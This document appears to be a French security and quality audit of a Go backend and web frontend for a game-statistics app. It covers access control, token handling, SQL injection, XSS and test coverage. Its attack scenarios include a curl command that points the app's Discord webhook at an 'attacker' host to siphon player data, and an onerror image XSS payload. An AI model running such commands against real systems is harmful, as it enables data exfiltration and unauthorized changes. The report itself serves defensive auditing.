# Audit qualité & sécurité — LevelUp `apps/go-api` + `apps/web`

> Date : 2026-07-02
> Périmètre : revue statique, lecture seule. Aucun fichier de code modifié.
> Méthode : 4 audits parallèles (couverture de tests, robustesse/erreurs, sécurité
> backend, sécurité frontend). Les 2 findings « Bloquant » ont été re-vérifiés
> manuellement sur le code.
> Références modèle : ADR 0019/0026 (anti-corruption ART DuckDB), ADR 0023 (tokens
> source unique), ADR 0029 (ownership joueur par xuid), ADR 0024 (LUSR v2).

## Résumé exécutif

| Sous-axe | Verdict | Constat dominant |
|---|---|---|
| Sécurité — contrôle d'accès | **Rouge** | 2 endpoints mutants montés **sans authentification** sous `/api/v1` (settings globaux + backfill progression sur joueur arbitraire) |
| Sécurité — tokens/secrets | Orange | Store canonique respecté, mais empreinte partielle du refresh token exposée via `/_diag/probe` (garde loopback seule) |
| Sécurité — injection SQL | **Vert** | Requêtes entièrement paramétrées ; interpolations `%s` sur placeholders/allowlists uniquement. Aucun vecteur exploitable |
| Sécurité — frontend (XSS) | Orange | ~40 tooltips ECharts en HTML non échappé, dont ~7 avec gamertags/noms de maps UGC (contenu tiers) |
| Robustesse / erreurs | Orange | 4 avalements silencieux à impact durable, dont la perte d'un refresh token roté (classe d'incident ADR 0023) |
| Couverture de tests | Vert clair | Ratio ~1:1 partout, garde-rails ART et ownership/token store bien testés ; gaps ciblés (recompute LUSR, tests Persister gated `integration`) |

Le socle défensif du projet est **solide et intentionnel** : chokepoint ownership
`/players/{slug}` non contournable par un xuid client, garde-rail anti-ART
(`no_art_patterns_test.go`) actif et testé, tokens jamais loggués en clair sur le
chemin serveur, SQL paramétré de bout en bout, cookie de session httpOnly. Les
problèmes graves ne sont **pas** dans ces mécanismes mais dans des handlers montés
**à côté** des groupes protégés.

---

## TOP 10 priorisé

| # | Sév. | Axe | Finding | Emplacement |
|---|---|---|---|---|
| 1 | **Bloquant** | Sécurité | `PATCH /settings` + POST associés non authentifiés -> exfiltration webhook Discord + DoS recompute | `server.go:1271`, `handlers/settings.go:103-114` |
| 2 | **Bloquant** | Sécurité | `POST /_admin/progression/backfill/{slug}` non authentifié -> écritures + recompute lourd sur n'importe quel joueur | `server.go:972` |
| 3 | **Majeur** | Robustesse | Refresh token roté perdu sans log si la persistance échoue -> chaîne auth du joueur morte définitivement | `internal/worldenrich/wiring.go:64` |
| 4 | **Majeur** | Sécurité | `GET /players` non filtré -> énumération identité (gamertag + XUID + SteamID) de tous les joueurs | `bootstrap_service.go:346`, `server.go:947` |
| 5 | **Majeur** | Sécurité | Empreinte du refresh token (head/tail/sha) via `/_diag/auto-sync/probe`, garde loopback seule | `handlers/admin_auto_sync.go:106-146`, `server.go:1251` |
| 6 | **Majeur** | Robustesse | Historique engagement vide silencieux -> scores de performance faux **persistés** en DB | `internal/sync/engagement.go:470-483` |
| 7 | **Majeur** | Sécurité | Diagnostics par joueur (CSR / progression / home) non authentifiés | `server.go:953-965` |
| 8 | **Majeur** | Robustesse | Co-membres famille nil silencieux -> `is_with_friends=false` erroné écrit durablement | `internal/api/server.go:99-103` |
| 9 | **Moyen** | Frontend | Tooltips ECharts en HTML non échappé sur données tierces (maps UGC, gamertags) -> XSS stocké possible | `squadMapHeatmapChart.ts:78`, `squadEfficiencyChart.ts`, `OutcomeSequenceTape.tsx:103` + ~5 sites |
| 10 | **Moyen** | Robustesse | Health check qui avale ses sondes -> rapporte « sain » quand la DB est en panne | `scheduler/data_health_check.go:215-283` |

---

## Axe 1 — Sécurité

### Bloquants (confirmés manuellement)

**B1 — `PATCH /settings` et ses actions POST montés sans auth** (`server.go:1271`).
`settingsHandler.Mount(r)` enregistre `PATCH /settings`, `POST /settings/media/scan`,
`POST /settings/sessions/recalculate`, `POST /settings/backup/run`,
`POST /settings/media/reset-index` sur le routeur **nu**. Le `Mount()` interne
(`settings.go:103-114`) ne pose aucun `RequireAuth`, contrairement à tous les autres
groupes opérationnels du fichier qui utilisent explicitement `r.Group` +
`r.Use(RequireAuth)` + `r.Use(RequireAdmin)` (lignes 904-905, 1100-1101, 1206-1208,
1318-1319). Seul le champ `instance_locked` est gardé en interne — preuve que
l'ouverture de l'endpoint était connue.
- Scénario : `curl -H "Origin: https://<app>" -X PATCH /api/v1/settings -d '{"discord_webhook_url":"https://attacker/hook"}'` détourne toutes les
  notifications (gamertags, scores) vers l'attaquant ; ou modifier `friend_gamertags`
  déclenche un recompute `is_with_friends` sur toutes les player DB. Le CSRF (vérif
  `Origin` seule) n'authentifie pas : hors navigateur, l'`Origin` est une valeur
  publique fixable.
- Reco : envelopper `settingsHandler.Mount` dans un groupe `RequireAuth`+`RequireAdmin`
  (les settings sont globaux à l'instance).

**B2 — Backfill progression non authentifié sur joueur arbitraire** (`server.go:972`).
`NewProgressionBackfillHandler(...).Mount(r.With(middleware.NoStore))` — `NoStore`
seul, pas d'auth. Malgré le préfixe `/_admin`, l'endpoint
`POST /_admin/progression/backfill/{slug}` **écrit** (streaks/records/milestones) et
lance un recompute lourd sur la player DB du slug, résolu côté serveur.
- Scénario : POST anonyme avec le slug d'une victime -> mutations non autorisées + DoS.
- Reco : déplacer sous le groupe `/admin` (RequireAuth+RequireAdmin) comme les autres
  `/_admin/*`.

**Cause racine commune** (B1, B2, M2, M4) : plusieurs handlers sont montés directement
sous `/api/v1` en dehors des groupes protégés, s'appuyant sur des gardes internes
partielles ou nulles. Il n'y a **pas** de `RequireAuth` global au niveau racine
(`server.go:302-323`). Recommandation transverse : auditer chaque
`Mount`/`r.Post`/`r.Get` hors groupe explicite et poser le middleware adéquat (no-op
automatique en mode demo/single-user).

### Majeurs

- **M2 — `GET /players` fuite l'identité de tous les joueurs** (`bootstrap_service.go:346`) :
  retourne tous les profils avec `gamertag`, `xuid`, `steam_id`, `waypoint_player`,
  sans le `filterOwnedPlayers` que `/bootstrap` applique pourtant. Divulgation
  d'identité inter-tenant. Reco : réutiliser `filterOwnedPlayers` ou gater sous
  `RequireAuth`.
- **M3 — Empreinte du refresh token via probe** (`admin_auto_sync.go:106-146`) :
  `refresh_token_head`(6) + `refresh_token_tail`(6) + sha256, servi sous
  `LoopbackOnly` seul. Robuste contre le spoofing d'en-têtes, mais **fail-open si un
  reverse proxy same-host forwarde vers 127.0.0.1** (risque noté dans le commentaire
  du fichier). Atténué par la topologie Docker actuelle (peer = IP bridge). Reco :
  ajouter `RequireAdmin` et retirer head/tail (garder le sha).
- **M4 — Diagnostics par joueur non authentifiés** (`server.go:953-965`) :
  `HealthHome`, `DiagCSR`, `DiagProgression` révèlent l'état pipeline d'un joueur sur
  simple slug. Reco : gater RequireAuth + ownership.

### Mineurs

- **A1-m1 — `RequirePlayerOwnership` fail-open sur slug inconnu**
  (`require_player_ownership.go:56-60`) : `found=false` -> laisse passer (handler
  répond 404). Sûr aujourd'hui (un seul titre actif), mais latent en multi-titre si
  des slugs étaient partagés entre propriétaires différents. Défense en profondeur :
  refuser (403) plutôt que passer quand une session existe mais que le slug est inconnu.
- **A4-m2 — `/setup/players` & `/setup/smoke-test` sans middleware** (`server.go:1280`) :
  atténué par gardes internes (`can_self_provision`, verrou d'instance, correspondance
  gamertag/XUID en session). Résiduel faible ; ajouter `RequireAuth` par cohérence.

### Injection SQL — vert

Aucun vecteur exploitable. Le helper `Placeholders(n)`/`ToAnySlice()`
(`platform/duckdb/shared_query_helpers.go`) est la norme sur ~80 sites `fmt.Sprintf`
audités ; toutes les interpolations `%s` sont des placeholders `?,?,?` ou des
identifiants issus d'allowlists/constantes :
- leaderboard `category` -> `statMetrics[category]` (map typée, `leaderboard_world_repo.go:469`)
- ORDER BY rivals -> colonnes `{frags,deaths}` gardées (`career_repo_encounters.go:146`)
- `asset_type` -> `columnMap` allowlist (`metadata_repo_assets.go:22`)
- IN-lists toujours en placeholders ; plus d'`ATTACH` runtime (ADR 0016).

Fragilités mineures **non atteignables** (à durcir par principe si un jour exposées
en HTTP) : `ops/archive.go:164` (`COPY ... WHERE xuid='%s'`, CLI only),
`analysis/identity.go:112` (noms de bots internes).

### Frontend (XSS) — moyen

ECharts rend les tooltips en HTML par défaut ; ~40 formatters custom interpolent des
données API sans échappement. Un seul fichier échappe (`BarStackedChart.tsx:210`,
helper local non partagé). ~7 sites touchent du **contenu tiers non fiable** : noms de
maps/variantes UGC et gamertags (`squadMapHeatmapChart.ts:78`,
`squadEfficiencyChart.ts:88`, `OutcomeSequenceTape.tsx:103`,
`RelationsMomentsHeatmap.tsx:83`, `squadFragBreakdownChart.ts:117`).
- Scénario : une map Forge nommée `<img src=x onerror=...>` remonte via l'API Halo et
  s'exécute quand la victime survole le point dans sa page Escouade. Atténué par le
  cookie de session httpOnly (pas de vol de token), mais permet des actions
  same-origin authentifiées.
- Reco : promouvoir `escapeHtml()` dans `charts/_utils.ts` et l'appliquer à toute
  interpolation non constante, ou passer ces tooltips en `renderMode:'richText'`. À
  corréler avec l'assainissement backend des noms d'assets.
- Positifs : aucun `dangerouslySetInnerHTML` sur données joueur (seulement du markdown
  de première partie : changelog/release-notes), aucun `eval`/`innerHTML`/`document.write`,
  pas de lib de rendu HTML dangereuse, aucun token en localStorage/sessionStorage
  (session en cookie httpOnly).

---

## Axe 2 — Tokens / secrets

État global sain. Les tokens ne vivent que dans `MultiUserTokenStore`
(`data/auth/watcher_tokens/{xuid}.json`, perms 0600/0700, ADR 0023) et dans les
fichiers de session (par conception). `data/auth` n'est servi par aucun fileserver
(seuls `/static/*` et le dist SPA sont exposés, avec anti-traversal). `discord_webhook_url`
est write-only côté API (`ToResponse` ne renvoie qu'un booléen de présence). Le DTO
admin token-health est métadonnées uniquement. `/debug/vars` est admin-gated, aucun
`pprof` exposé.

Fuites résiduelles :
- **Majeur** — empreinte RT via `/_diag/auto-sync/probe` (cf. M3 ci-dessus).
- **Mineur** — `scripts/warm_bp_assets/main.go:176` logge 10 car. du SpartanToken
  (`safePrefix`). Script CLI hors chemin serveur, token éphémère. Reco : logger « OK »
  sans préfixe.
- **Mineur** — `cmd/get-token/main.go:58` imprime le SpartanToken complet sur stdout,
  mais c'est la fonction de ce CLI dev (JGtm hardcodé). Ne jamais capturer sa sortie
  dans des logs ; envisager un build tag dev.
- Dette Phase 5 documentée (ADR 0023) : sessions Spartan/Clearance en clair dans
  `data/sessions/<id>.json` (0600, TTL ~4h) ; 2e store legacy `data/auth/watcher_tokens.json`.
  Writers `sync_meta.oauth_refresh_token` tous whitelistés par
  `platform/auth/sentinel_test.go:150`.

---

## Axe 3 — Robustesse & gestion d'erreurs

Points forts confirmés : garde-rail ART complet et allowlist minimale justifiée ;
capability-gating `ErrCapabilityNotSupported` systématique côté services (~25 sites) ;
zéro `fmt.Println`/`log.Printf` en prod ; aucune écriture DB directe dans
handlers/services ; maps package-level construites en `init()` sans mutation runtime.

Avalements silencieux à impact durable (les 4 majeurs) :
- `worldenrich/wiring.go:64` — `_ = store.UpdateOAuthRefreshToken(...)` : si l'écriture
  du RT roté échoue, le nouveau RT est perdu sans log -> prochain refresh
  `invalid_grant` -> auth du joueur morte (re-capture interdite par le modèle). C'est
  exactement l'incident Madina de l'ADR 0023.
- `sync/engagement.go:470-483` — historique retourné `nil` sur erreur de requête (vue
  renommée après migration) -> chaque match calculé comme « premier match », score faux
  **flush en DB**. `rows.Err()` non vérifié.
- `api/server.go:99-103` — `familyXUIDResolver` retourne `nil` sans log si le fichier
  groups est corrompu -> `is_with_friends=false` écrit durablement, indétectable.
- `scheduler/data_health_check.go:215-283` — sondes avalées (`if err != nil { continue }`)
  -> le check rapporte « aucun problème » quand la DB est inaccessible.

Reco commune : ajouter au minimum `slog.WarnContext`/`ErrorContext` avec `"err"` avant
toute dégradation, et un compteur d'observabilité sur les sites de persistance
best-effort.

Autres :
- Panic runtime possible au 1er match d'un titre mal câblé
  (`sync/skill_chain_provider.go:61`) : valider au boot plutôt qu'au runtime.
- Pas de mapper HTTP central pour `ErrCapabilityNotSupported` (seuls `match_events.go:71`
  et `squad_v2.go:127` mappent) -> risque de 500 brut sur un futur endpoint. Reco :
  middleware/helper Huma central -> 503/204.
- Dette de convention : ~42 `slog.Error` sans `Context` ; 15 sites `"err", err.Error()`
  stringifié au lieu de l'`error` brute ; params HTTP invalides silencieusement
  défaultés (`notifications.go:320`, `catalog.go:107,140`).
- Best-effort sync non journalisés : `sync/career.go:137`, `sync/backfill_weapons.go:57,149`,
  `sync/engagement.go:169` ; one-shot CSRF/PKCE non garanti si Save échoue
  (`auth_xbox_oauth.go:229,245`) ; traductions de modes perdues silencieusement
  (`catalog_fetcher_service.go:282`, `ops/catalog_refresh.go:278` — classe « GUID partout »).

Race conditions DB : PASS. Garde-rail ART actif (`no_art_patterns_test.go` allowlist
3 entrées justifiées) ; aucun `Exec` INSERT/UPDATE/DELETE direct dans handlers/services.

---

## Axe 4 — Couverture de tests

Globalement **proportionnée au risque**. Ratio source/test ~1:1 partout.

| Zone | Sources | Tests | Ratio |
|---|---|---|---|
| `internal/analysis/` (récursif) | 124 | 113 | ~0.91 |
| `internal/service/` | 127 | 121 | ~0.95 |
| `internal/api/handlers/` | 86 | 94 | ~1.09 |
| `internal/api/middleware/` | 19 | 18 | ~0.95 |
| `internal/persist/` | 19 | 16 | ~0.84 |
| `internal/sync/` | 131 | 180 (1083 fns) | ~1.37 |
| `internal/platform/auth/` | 30 | 34 | ~1.13 |

Note structurelle : il n'existe pas de package `internal/auth` — l'auth vit dans
`internal/platform/auth/` (MultiUserTokenStore) et l'ownership dans `internal/authz/`
+ `internal/api/middleware/require_player_ownership.go`.

Points forts :
- `sync/` + `persist/` = zone la mieux couverte (garde-rails ART testés à 4 niveaux,
  chaque `*Persister` a son test idempotence/atomicité/INSERT-only, `queue_test.go`
  couvre WAL/circuit-breaker/concurrence).
- `analysis/` couvre les cas limites (division par zéro KDR à
  `indicators_test.go:51`, listes vides, NaN/Inf `lowess_test.go:71`) de façon
  systématique.
- Auth/ownership testés y compris adversarial : `RejectsPathTraversal`
  (`multi_user_token_store_concurrency_test.go:252`), `ForeignSlug_403`,
  `FamilyStranger_403` (`require_player_ownership_test.go`).
- `internal/api/handlers/` : httptest dans 77/94 fichiers ; statuts d'erreur assertés
  (404 dans 43 fichiers, 500 dans 33, 403 dans 9, 401 dans 7) — pas happy-path-only.
- Garde-fou architectural : `service/no_duckdb_import_test.go` verrouille l'interdiction
  d'import DuckDB par les services.

Gaps à combler :
- `internal/sync/lusr_full_recompute.go` — `RecomputeLUSRCanonicalForPlayer`
  (orchestrateur recompute LUSR v2, 3 callers dont migration + backfill CLI) n'est
  exécuté par **aucun** test ; seules les briques mathématiques le sont. Risque de
  régression silencieuse d'ordre de matchs/watermark.
- Tests Persister derrière `//go:build integration` : un `go test ./...` nu **saute**
  les tests anti-ART les plus critiques (le Makefile les lance bien avec
  `-tags=integration`, mais un run local sans tag donne un faux vert).
- Fonctions exportées sans test : `ComputeMedalExploitScore`
  (`analysis/medal_exploit.go:22`), `GetTiming` (`analysis/weapon_data.go:224`).
- Couverture mince (1 seul test référent) : `ComputeImpactSummary`, `ComputeMVPLVP`,
  `ComputeTrend`, `ComputeSquadPerformanceScore`.
- Middleware sans test : `http_cache.go`, `read_budget.go` (read_budget touche la
  contention DB).

---

## Recommandations

À traiter avant toute mise en prod multi-utilisateur (Bloquants) :
1. Gater `settingsHandler.Mount` sous `RequireAuth`+`RequireAdmin`.
2. Déplacer `NewProgressionBackfillHandler` sous le groupe `/admin`.
3. Passer en revue exhaustive tous les `Mount`/`r.Get`/`r.Post` sous `/api/v1` hors
   groupe explicite (au moins `/players`, `/settings`, diagnostics, `/setup`) et poser
   la garde adéquate — no-op automatique en demo.

Court terme (Majeurs) :
4. Ajouter un log + compteur sur `worldenrich/wiring.go:64` (perte de RT roté).
5. Filtrer `GET /players` par ownership ; durcir `/_diag/auto-sync/probe`
   (RequireAdmin + retirer head/tail).
6. Logger les erreurs avalées de `sync/engagement.go`, `server.go:99`,
   `data_health_check.go` avant dégradation.
7. Centraliser `escapeHtml()` frontend et l'appliquer aux tooltips ECharts à données
   tierces.

Moyen terme (dette qualité) :
8. Test d'intégration sur `RecomputeLUSRCanonicalForPlayer` ; s'assurer que la CI n'est
   jamais verte sans `-tags=integration`.
9. Middleware Huma central pour `ErrCapabilityNotSupported` -> 503.
10. Nettoyage logging (`ErrorContext` + clé `"err"` brute) et validation au boot des
    classifiers de titre.

---

## Positifs confirmés (à préserver)

- Chokepoint ownership `/players/{slug}` correct et non contournable par un xuid client.
- `/sync/*` & `/backfill` admin-gated ; import OpenSpartan auto-scopé session.
- Anti-traversal média solide (`media_serve.go:22-27, 88-128`).
- SQL entièrement paramétré ; tokens non loggués/non sérialisés en clair (chemin serveur).
- `data/auth` non exposé ; webhook write-only ; DTOs token = métadonnées seules.
- Garde-rail ART complet et testé ; capability-gating systématique côté services.
